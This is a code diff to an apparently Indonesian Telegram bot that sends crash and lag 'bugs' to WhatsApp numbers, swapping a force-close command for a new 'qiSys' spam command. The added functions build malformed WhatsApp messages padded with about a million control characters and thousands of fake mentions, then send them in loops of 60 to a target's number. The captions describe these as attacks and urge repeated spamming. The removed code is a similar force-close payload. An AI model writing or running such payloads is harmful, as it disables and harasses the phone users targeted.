@@ -1,4 +1,4 @@
-<///CREDIT BASE BY AMBALABU 
+///CREDIT BASE BY AMBALABU 
 /// NO HAPUS CREDIT 
 (function() {
   'use strict'
@@ -1170,14 +1170,11 @@ bot.action("xbugs", async (ctx) => {
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-╭═───⊱『 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡        ───⊱  DELAY TYPE ───═⬡
-◇ /specterdelay 
-◇ /delayworek
-◇ /EquarTerdelay
-
-     ───⊱ FORCECLOSE TYPE ───═⬡
-◇ /forceInTs
-
+╭═───⊱『 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡        
+◇ /specterdelay - Delay No Kenon
+◇ /delayworek - Delay Hard Worth ( Maybe )
+◇ /EquarTerdelay - One Shoot Delay 
+◇ /qiSys - Delay Hard Can Spam No Kenon
 ╭═───⊱『 𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
 ◇ /combox
 </pre>
@@ -2186,21 +2183,22 @@ bot.command("EquarTerdelay", checkAllPremium, checkWhatsAppConnection, async (ct
   })();
 
 });
-/// CASE BUG FORCECLOSE ///
-bot.command("forceInTs", checkWhatsAppConnection, checkPremium, async (ctx) => {
+/// CASE BUG BEBAS SPAM 4 ///
+bot.command("qiSys", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`Example: /forceInTs 62xxxx`);
+  if (!q) return ctx.reply(`Example: /qiSys 62xxxx`);
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
   await ctx.sendPhoto("https://files.catbox.moe/pm6sti.jpg", {
     caption: `
-<blockquote>交 Gxion System Attacks ᝄ</blockquote>  
-─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.
+<pre>交 Gxion System Attacks ᝄ
+─ 𝙱𝚞𝚐 𝚜𝚞𝚌𝚌𝚎𝚜 𝚍𝚒𝚔𝚒𝚛𝚒𝚖 𝚔𝚎 𝚝𝚊𝚛𝚐𝚎𝚝, 𝚜𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝚜𝚙𝚊𝚖  𝚋𝚞𝚐𝚜 𝚔𝚎𝚙𝚊𝚍𝚊 𝚝𝚊𝚛𝚐𝚎𝚝 𝚜𝚊𝚖𝚙𝚎 𝚖𝚊𝚖𝚙𝚞𝚜. 𝙶𝚞𝚗𝚊𝚔𝚊𝚗𝚕𝚊𝚑 𝚜𝚎𝚌𝚊𝚛𝚊 𝚋𝚒𝚓𝚊𝚔 𝚍𝚊𝚗 𝚓𝚊𝚗𝚐𝚊𝚗 𝚍𝚒 𝚜𝚊𝚕𝚊𝚑𝚐𝚞𝚗𝚊𝚔𝚊𝚗 👾
 
 "⬡═―━⊱[ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤 ]⊰━—═⬡
 ☇ Target: ${q}
 ☇ Status: Succes
-☇ Type: Forceclose
+☇ Type: DELAY HARD IMVISIBLE MAYBE
+</pre>
 `,
     parse_mode: "HTML",
     reply_markup: {
@@ -2209,10 +2207,13 @@ bot.command("forceInTs", checkWhatsAppConnection, checkPremium, async (ctx) => {
   });
 
   (async () => {
-    for (let i = 0; i < 40; i++) {
-      console.log(chalk.red(`Send Bug Forceclose Free Spam ${i + 1}/30 To ${q}`));
-      await TheInfinityFools(sock, target);
+    for (let i = 0; i < 60; i++) {
+      console.log(chalk.red(`Send Bug Delay Hard Spam ${i + 1}/30 To ${q}`));
+      await DelayedStatusHard(sock, target);
       await sleep(1000);
+      
+      await SuperDelay(sock, target);
+      await sleep (1000);
     }
   })();
 });
@@ -2412,52 +2413,95 @@ async function ArTDeadass(sock, target) {
   }
 }
 
-async function TheInfinityFools(sock, target) {
-  console.log("Success Send Bug Forclose Vnx");
+async function DelayedStatusHard(sock, target) {
+var mbg = generateWAMessageFromContent(target, {
+viewOnceMessage: {
+message: {
+interactiveResponseMessage: {
+body: {
+text: "VnX"
+},
+nativeFlowResponseMessage: {
+name: "call_permission_request",          
+paramsJson: "\x10", 
+version: 3,
+}, 
+entryPointConversionSource: "call_permission_request"    
+}
+}
+}
+},
+{
+participant: { jid: target },
+},
+);
+
+
+  let mbg2 = generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            contextInfo: {
+              remoteJid: "#VnXNew  !",
+              mentionedJid: ["13135559098@s.whatsapp.net"],
+            },
+            body: {
+              text: "VnX",
+              format: "DEFAULT",
+            },
+            nativeFlowResponseMessage: {
+              name: "address_message",
+              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"VnX","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
+              version: 3,
+            },
+          },
+        },
+      },
+    },
+    {
+      participant: { jid: target },
+    },
+  );
+
+  await sock.relayMessage('status@broadcast', mbg.message, {
+    statusJidList: [target]
+  });
   
-  let msg = {
-    viewOnceMessage: {
-      message: {
-        interactiveMessage: {
-          body: {
-            text: "Vnx - Forclose",
-          },
-          nativeFlowMessage: {
-            buttons: [
-              {
-                name: "send_location",
-                buttonParamsJson: JSON.stringify({
-                  name: "Forclose - Vnx",
-                  address: ""
-                })
-              }
-            ]
-          },
-          messageContextInfo: {
-            deviceListMetadata: {},
-            deviceListMetadataVersion: 3
+  await sock.relayMessage('status@broadcast', mbg2.message, {
+    statusJidList: [target]
+  });
+}
+
+async function SuperDelay(sock, target) {
+  const msg = {
+    message: {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "A - r - T",
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "galaxy_message",
+              paramsJson: "\u0000".repeat(1045000),
+              version: 3
+            },
+           contextInfo: {
+            mentionedJid: Array.from({ length: 1990 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
+            groupMentions: Array.from({ length: 2000 }, () => ({
+            groupJid: `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`,
+            groupSubject: "Artillery - Team"
+            }))
+            },
           }
         }
       }
     }
   };
-  
-  await sock.relayMessage(target, msg, {
-    participant: { jid: target },
-    userJid: target,
-    messageId: null
-  });
-  
-  let msg1 = {
-    sendPaymentMessage: {}
-  };
-  
-  await sock.relayMessage(target, msg1, {
-    participant: { jid: target },
-    quoted: null,
-    userJid: target,
-    messageId: null
-  });
+ await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, { participant: { jid: target } });
 }
 
 // --- Jalankan Bot --- //
